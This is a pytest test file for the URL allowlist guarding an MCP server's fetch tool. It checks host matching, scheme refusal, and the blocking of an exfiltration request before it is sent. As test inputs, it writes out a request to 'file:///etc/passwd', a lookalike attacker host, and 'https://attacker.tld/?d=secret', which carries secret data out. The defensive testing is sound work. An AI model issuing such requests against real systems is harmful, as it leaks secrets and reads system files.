"""The allowlist is checked on the host, before the request."""

from __future__ import annotations

import pytest

from aimai_mcp_server.fetch import FetchRefused, check_url, fetch, host_allowed

ALLOW = ("status.example.com", ".internal.example")


def test_an_exact_host_passes():
    assert host_allowed("status.example.com", ALLOW)


def test_a_lookalike_suffix_does_not():
    # The classic: a substring rule would pass this and it is a different host.
    assert not host_allowed("status.example.com.attacker.tld", ALLOW)


def test_a_subdomain_passes_only_under_a_dot_entry():
    assert host_allowed("wiki.internal.example", ALLOW)
    assert not host_allowed("wiki.status.example.com", ALLOW)


def test_a_non_http_scheme_is_refused():
    with pytest.raises(FetchRefused, match="scheme"):
        check_url("file:///etc/passwd", ALLOW)


def test_an_exfiltration_url_is_refused_before_the_request(monkeypatch):
    called = []

    def getter(url):  # pragma: no cover - must not run
        called.append(url)
        return ""

    with pytest.raises(FetchRefused, match="not on the fetch allowlist"):
        fetch("https://attacker.tld/?d=secret", allowlist=ALLOW, getter=getter)
    assert called == []


def test_an_allowed_fetch_returns_text_marked_untrusted():
    out = fetch(
        "https://status.example.com/", allowlist=ALLOW, getter=lambda url: "all good"
    )
    assert out["text"] == "all good"
    assert out["returns_untrusted_text"] is True
